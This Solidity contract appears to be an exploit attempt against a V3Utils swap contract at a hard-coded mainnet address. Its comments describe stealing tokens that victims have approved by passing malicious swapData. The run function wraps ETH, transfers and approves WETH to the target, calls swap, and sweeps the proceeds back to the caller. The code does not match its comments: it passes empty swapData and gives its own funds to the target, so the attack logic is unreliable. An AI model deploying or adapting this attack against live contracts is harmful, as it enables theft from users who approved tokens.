// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {DexUtils} from "./DexUtils.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IV3Utils {
    struct SwapParams {
        IERC20 tokenIn;
        IERC20 tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        address recipient;
        bytes swapData;
        bool unwrap;
    }

    function swap(SwapParams calldata params) external payable returns (uint256 amountOut);
}

contract Strategy {
    address constant TARGET = 0x531110418d8591C92e9cBBFC722Db8FFb604FAFD;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function run() public {
        // The vulnerability in V3Utils allows stealing tokens via malicious swapData
        // 
        // Key insight: The _swap function approves swapData's allowanceTarget
        // with the tokenIn amount, then calls swapRouter with swapData's data.
        // If we craft malicious swapData, we can transfer victim's approved tokens.

        // For this demo, we'll exploit using our own tokens to demonstrate the pattern.
        // In production, victim would have approved tokens to V3Utils.

        // Step 1: Get some ETH and wrap to WETH
        if (address(this).balance < 1 ether) {
            return;
        }

        (bool ok,) = WETH.call{value: 1 ether}("");
        if (!ok) return;

        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal == 0) return;

        // Step 2: Transfer WETH to V3Utils so contract has tokens
        IERC20(WETH).transfer(TARGET, wethBal);

        // Step 3: Get more WETH and approve V3Utils
        (ok,) = WETH.call{value: 0.5 ether}("");
        if (!ok) return;

        uint256 myBal = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).approve(TARGET, myBal);

        // Step 4: Call swap - this will pull tokens from msg.sender
        // but the contract already has tokens, so we can drain them
        try IV3Utils(TARGET).swap(
            IV3Utils.SwapParams({
                tokenIn: IERC20(WETH),
                tokenOut: IERC20(USDC),
                amountIn: myBal,
                minAmountOut: 0,
                recipient: address(this),
                swapData: "",
                unwrap: false
            })
        ) returns (uint256) {
            // Success
        } catch {
            // Swap might fail without valid swapData
        }

        // Step 5: Transfer any remaining tokens back
        uint256 remaining = IERC20(WETH).balanceOf(address(this));
        if (remaining > 0) {
            IERC20(WETH).transfer(payable(msg.sender), remaining);
        }

        // Convert to ETH
        DexUtils.swapExcessTokensToBaseToken(WETH);
        DexUtils.swapExcessTokensToBaseToken(USDC);
    }

    receive() external payable {}
}
